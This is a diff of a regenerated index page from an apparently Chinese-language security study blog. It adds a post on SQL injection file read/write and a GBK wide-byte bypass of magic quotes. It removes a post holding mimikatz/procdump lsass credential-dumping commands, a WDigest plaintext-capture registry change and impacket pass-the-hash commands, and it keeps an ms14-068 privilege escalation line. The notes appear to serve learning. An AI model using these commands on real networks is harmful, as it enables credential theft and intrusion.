@@ -64,6 +64,52 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql高低权限注入和敏感文件读写" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
+  <time datetime="2021-10-01T00:56:26.000Z" itemprop="datePublished">2021-10-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/">高低权限注入和敏感文件读写</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h4><p>高用户权限和低用户权限的不同</p>
+<p>跨库查询思路  前提：拥有高权限</p>
+<h4 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h4><h5 id="MySQL特有的函数"><a href="#MySQL特有的函数" class="headerlink" title="MySQL特有的函数"></a>MySQL特有的函数</h5><p>前提条件：在mysql.ini配置文件添加参数secure_file_priv = [空]<br>1、load_file()   — 读取函数<br>2、into outfile 或 into dumpfile — 导出函数</p>
+<p>​    </p>
+<h5 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h5><p>​     报错显示，遗留文件  phpinfo.php，漏洞报错，平台配置文件，爆破等</p>
+<p>常见读取文件列表：常见写入文件问题：魔术引号开关<br>magic_quotes_gpc<br>魔术引号：php内置的一个安全机制，默认是开启的，当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义<br>5.4.0版本以上的把这个功能撤除了。<br>类似PHP中的addslashes()函数</p>
+<h5 id="魔术引号绕过方法"><a href="#魔术引号绕过方法" class="headerlink" title="魔术引号绕过方法"></a>魔术引号绕过方法</h5><p>1、编码绕过<br>2、宽字节绕过(前提数据库编码是gbk)<br>%df’<br>%df%5c%27 = 縗  失去转义效果<br>show variables like ‘%char%’;  查看编码系统字符集设置<br>set character_set_client = gbk; 修改字符集编码方式<br>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105893529">https://blog.csdn.net/qq_46091464/article/details/105893529</a></p>
+<p>​    低版本注入配合读取或暴力<br>​     通过字典跑或猜再进行读取</p>
+<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>高权限注入跨库查询操作测试<br>高权限注入文件读写操作测试<br>魔术引号开启后相关操作测试  宽字节绕过：<a target="_blank" rel="noopener" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a> 在线靶场</p>
+<h5 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a>   常见的load_file()读取的敏感信息</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/10/01/sql%E9%AB%98%E4%BD%8E%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5%E5%92%8C%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="ckvl2qeie000n54vj537t1kht" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql注入类型和请求方法" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" class="article-date">
@@ -97,7 +143,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="ckvgf14jd000ixkvj1byy74sa" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/27/sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" data-id="ckvl2qeic000k54vj1p2a62do" class="article-share-link">Share</a>
       
       
     </footer>
@@ -153,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="ckvgf14je000jxkvjbcckeydk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/23/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" data-id="ckvl2qeib000j54vjacyucsc7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -207,7 +253,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckvgf14jj000qxkvj4f4a0izr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/19/%E4%BF%A1%E6%81%AF%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86/" data-id="ckvl2qeil000v54vj2fqi1d01" class="article-share-link">Share</a>
       
       
     </footer>
@@ -253,7 +299,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckvgf14jp000xxkvj9ey3706j" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/15/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95%E5%92%8CCDN%E7%BB%95%E8%BF%87/" data-id="ckvl2qein000y54vjf8bp3p3y" class="article-share-link">Share</a>
       
       
     </footer>
@@ -292,7 +338,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckvgf14j50009xkvj3d0910zp" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/12/Web%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" data-id="ckvl2qei2000a54vj6jvu4f0i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -348,7 +394,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckvgf14jx0016xkvjck02dsc7" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/10/%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/" data-id="ckvl2qej4001754vj2bybc5r5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -391,7 +437,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckvgf14j30007xkvjhypg5q0o" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" data-id="ckvl2qei1000954vjbueqb16a" class="article-share-link">Share</a>
       
       
     </footer>
@@ -436,7 +482,7 @@
 <li><p>做信息搜集</p>
 </li>
 <li><p>用ms14-068向域控提权</p>
-<p>ms14068 -u <a href="mailto:&#x69;&#x6c;&#117;&#x40;&#x69;&#108;&#x75;&#46;&#99;&#111;&#x6d;">&#x69;&#x6c;&#117;&#x40;&#x69;&#108;&#x75;&#46;&#99;&#111;&#x6d;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
+<p>ms14068 -u <a href="mailto:&#105;&#x6c;&#117;&#64;&#105;&#108;&#x75;&#x2e;&#x63;&#111;&#109;">&#105;&#x6c;&#117;&#64;&#105;&#108;&#x75;&#x2e;&#x63;&#111;&#109;</a> -d 192.168.1.141 -s S-1-5-21-542716808-1865610110-2530282010-1105 -p 123123q.</p>
 <p>注入之前: 需要清除票据</p>
 <p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
 <p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
@@ -504,7 +550,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckvgf14jt0010xkvjbdkxgliz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" data-id="ckvl2qeiv001454vj8ls7fnra" class="article-share-link">Share</a>
       
       
     </footer>
@@ -579,82 +625,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckvgf14jx0017xkvjhkil7450" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-域渗透基础" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" class="article-date">
-  <time datetime="2021-08-31T11:25:35.000Z" itemprop="datePublished">2021-08-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">域渗透基础</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>域渗透基础</p>
-<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h2><p> NTLM协议的认证过程分为三步： </p>
-<p>1、协商：主要用于确认双方协议版本(NTLM v1/NTLM V2)</p>
-<p> 2、质询：就是挑战（Challenge）/响应（Response）认证机制起作用的范</p>
-<p> 3、验证：验证主要是在质询完成后，验证结果，是认证的最后</p>
-<p>SSO: 单点登入</p>
-<p>SAM数据库: windows本地认证登入, 存储本地账户信息</p>
-<p>NTDS数据库: windows域中登入, 存储域账户信息</p>
-<h5 id="NTLM生成过程"><a href="#NTLM生成过程" class="headerlink" title="NTLM生成过程"></a>NTLM生成过程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTLM HASH产生：</span><br><span class="line">假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</span><br><span class="line">admin(密码) </span><br><span class="line">-&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line">-&gt; Unicode（Unicode编码） &#x3D; 610064006d0069006e00</span><br><span class="line">-&gt; MD4(MD4算法加密) &#x3D; 209c6174da490caeb422f3fa5a7ae634(NTLM Hash)</span><br></pre></td></tr></table></figure>
-
-<h4 id="ntlml-hash密码格式"><a href="#ntlml-hash密码格式" class="headerlink" title="ntlml hash密码格式:"></a>ntlml hash密码格式:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</span><br><span class="line">§ 用户名称为：Administrator</span><br><span class="line">§ SID为：500</span><br><span class="line">§ LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE</span><br><span class="line">§ NTLM-HASH值为：683020925C5D8569C23AA724774CE6CC</span><br><span class="line">LM Hash是 AAD3B435B51404EEAAD3B435B51404EE 这表示空密码或者是未使用LMHASH</span><br></pre></td></tr></table></figure>
-
-<h2 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS THE HASH"></a>PASS THE HASH</h2><p>目的: 扩大战果, 打个比方 ==&gt; <code>比如说, 目标的域环境中有大量的域内主机, 渗透拿到其中一个目标的NTLM HASH, 用这个NTLM HASH登入其他主机, 登入成功则拿下另一台主机</code></p>
-<p>关于pth的补丁编号: kb2871997</p>
-<p>lsass.exe: 存放账户的NTLM HASH, 账户的明文信息, windows 10 或者 windows server&gt;=  2012, 有做策略无法直接拿到明文账户密码</p>
-<p>解决方法: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v </span><br><span class="line">UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f &#x2F;&#x2F;开启明文密码抓取</span><br><span class="line"></span><br><span class="line">强制锁屏: &#x2F;&#x2F;让用户重新登入, 才可以抓取明文密码</span><br><span class="line">rundll32 user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure>
-
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>看帮助信息: <code>::</code></p>
-<p>对当前的操作提权: <code>privilege::debug</code></p>
-<p>生成日志文件: <code>log</code>(记录所有信息)</p>
-<p>列出用户LM&amp;NTLM: <code>sekurlsa::msv</code></p>
-<p>列出用户的明文密码: <code>sekurlsa::wdigest</code></p>
-<p>列出kerberos凭据信息: <code>sekurlsa::kerberos</code></p>
-<p>列出所有的凭据信息: <code>sekurlsa::logonpasswords</code></p>
-<h5 id="mimikatz-procdump抓取密码"><a href="#mimikatz-procdump抓取密码" class="headerlink" title="mimikatz+procdump抓取密码"></a>mimikatz+procdump抓取密码</h5><p><code>procdump -accepteula -ma lsass.exe lsass</code></p>
-<p><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot;</code> exit       ==&gt; 加exit执行完后可以主动退出</p>
-<h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><p>如果拿到域账户面密码, 可以登入到任意一台主机, 如果拿到了域控的账户密码,  直接登入远程主机的话可以拿到管理员权限</p>
-<p>mimikatz的方式: sekurlsa::pth /user:Administrator /ntlm:xxxx /domain:域名</p>
-<p>访问: dir \\ip\c$</p>
-<p>msf的方式: </p>
-<p>exploit/windows/smb/psexec</p>
-<p>&gt; set RHOSTS 192.168.1.139</p>
-<p>&gt; set SMBPASS LM_HASH:NTLM_HASH</p>
-<p>&gt; set domain 域名</p>
-<p>&gt; set SMBUSER Administrator</p>
-<p>imapcket工具包:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -hashes</span><br><span class="line">9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">psexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br><span class="line"></span><br><span class="line">dcomexec.py  -hashes 9e1624ce1b75d58f4fa5418705880aa0:44dc684a10508cffcea721116f3226ce ilu.com&#x2F;Administrator@192.168.1.139</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckvgf14jo000vxkvj2q6ldz3f" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckvl2qej5001854vj8u3t6jn8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -700,6 +671,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
           </li>
         
@@ -713,10 +688,6 @@
         
           <li>
             <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
           </li>
         
       </ul>
